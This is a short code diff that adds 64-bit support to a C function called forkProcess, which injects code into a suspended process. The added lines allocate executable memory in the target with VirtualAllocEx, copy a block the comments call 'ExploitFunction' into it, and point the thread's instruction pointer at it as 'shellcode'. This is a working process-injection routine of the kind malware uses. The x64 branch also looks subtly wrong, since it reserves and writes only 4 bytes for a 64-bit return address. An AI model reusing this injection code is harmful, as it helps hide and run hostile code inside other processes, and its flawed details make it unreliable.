@@ -247,6 +247,24 @@ VOID forkProcess(VOID)
 	MyGetThreadContext(ProcessInformation.hThread, &ctx);
 
 	// Create space on the stack for the return address
+#if defined(_WIN64)
+	ctx.Rsp -= sizeof(DWORD);
+
+	// Write current EIP to the stack
+	MyWriteProcessMemory(ProcessInformation.hProcess, (LPVOID)ctx.Rsp, (LPCVOID)ctx.Rip, sizeof(DWORD), NULL);
+
+	// Allocate memory in the new process
+	memBaseAddress = MyVirtualAllocEx(ProcessInformation.hProcess, 0, (DWORD64)forkProcess - (DWORD64)Begin, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+
+	// Write ExploitFunction to suspended process
+	MyWriteProcessMemory(ProcessInformation.hProcess, memBaseAddress, (LPCVOID)Begin, (DWORD64)forkProcess - (DWORD64)Begin, 0);
+
+	// Setup CONTEXT
+	ctx.ContextFlags = CONTEXT_FULL;
+
+	// Set EIP to new shellcode location
+	ctx.Rip = (DWORD64)memBaseAddress;
+#else
 	ctx.Esp -= sizeof(unsigned int);
 
 	// Write current EIP to the stack
@@ -263,6 +281,7 @@ VOID forkProcess(VOID)
 
 	// Set EIP to new shellcode location
 	ctx.Eip = (DWORD)memBaseAddress;
+#endif
 
 	// Set the thread context
 	MySetThreadContext(ProcessInformation.hThread, &ctx);
